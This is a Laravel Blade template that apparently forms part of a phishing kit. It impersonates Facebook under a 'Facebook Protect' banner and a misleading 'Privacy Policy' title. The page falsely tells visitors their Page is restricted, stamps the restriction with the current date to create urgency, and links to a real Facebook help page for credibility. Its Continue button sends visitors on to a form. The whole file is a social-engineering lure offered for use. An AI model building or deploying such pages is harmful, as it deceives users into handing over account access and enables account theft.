@extends('layouts.main')

@section('title', 'Privacy Policy')

@section('content')
<div class="sm:w-11/12 md:w-2/3 lg:w-2.5/5 xl:w-2/5 w-11/12 mx-auto pt-14">

    <div class="rounded-lg overflow-hidden mb-5">
        <img src="{{ asset('assets/images/B2Y8S9I.jpg') }}" class="mx-auto block mb-5 w-full h-full mb-0">
    </div>

    <p class="font-bold text-2xl">Welcome To Facebook Protect.</p>
    <p class="my-5">Your page's accessibility is limited, so we ask that higher security requirements be applied to that account. We created this security program to unlock your Pages.
        <a class="text-blue-500 hover:underline block" href="https://www.facebook.com/help" target="_blank">More information</a>
    </p>

    <div class="px-[14px]">
        <ol class="relative text-gray-500 border-s-2 border-gray-200">
            <li class="mb-10 ms-6">
                <span
                    class="absolute flex items-center justify-center w-6 h-6 bg-[#C4C4C4] rounded-full -start-[14px] ring-4 ring-white">
                    <svg class="w-3 h-3 text-white" aria-hidden="true"
                        xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 16 12">
                        <path stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
                            d="M1 5.917 5.724 10.5 15 1.5" />
                    </svg>
                </span>
                <h3 class="text-black">We've enabled advanced protections to unlock your Page.</h3>
            </li>
            <li class="mb-10 ms-6">
                <span
                    class="absolute flex items-center justify-center w-6 h-6 bg-facebook rounded-full -start-[14px] ring-4 ring-white">
                    <svg class="w-3 h-3 text-white" aria-hidden="true"
                        xmlns="http://www.w3.org/2000/svg" fill="currentColor" viewBox="0 0 20 16">
                        <path
                            d="M18 0H2a2 2 0 0 0-2 2v12a2 2 0 0 0 2 2h16a2 2 0 0 0 2-2V2a2 2 0 0 0-2-2ZM6.5 3a2.5 2.5 0 1 1 0 5 2.5 2.5 0 0 1 0-5ZM3.014 13.021l.157-.625A3.427 3.427 0 0 1 6.5 9.571a3.426 3.426 0 0 1 3.322 2.805l.159.622-6.967.023ZM16 12h-3a1 1 0 0 1 0-2h3a1 1 0 0 1 0 2Zm0-3h-3a1 1 0 1 1 0-2h3a1 1 0 1 1 0 2Zm0-3h-3a1 1 0 1 1 0-2h3a1 1 0 1 1 0 2Z" />
                    </svg>
                </span>
                <h3 class="text-black">Below, we walk you through the process in detail and help you fully activate to unlock your Page.</h3>
            </li>
        </ol>
    </div>

    <a href="{{ route('form') }}"
        class="block text-lg cursor-pointer bg-blue-500 w-full text-center xl:py-3 sm:py-3 py-3 text-white rounded-lg font-semibold">Continue</a>
    <p class="text-center block mt-3 mb-5">Your page was restricted on <strong>{{ date('F j, Y') }}</strong>.</p>
</div>
@endsection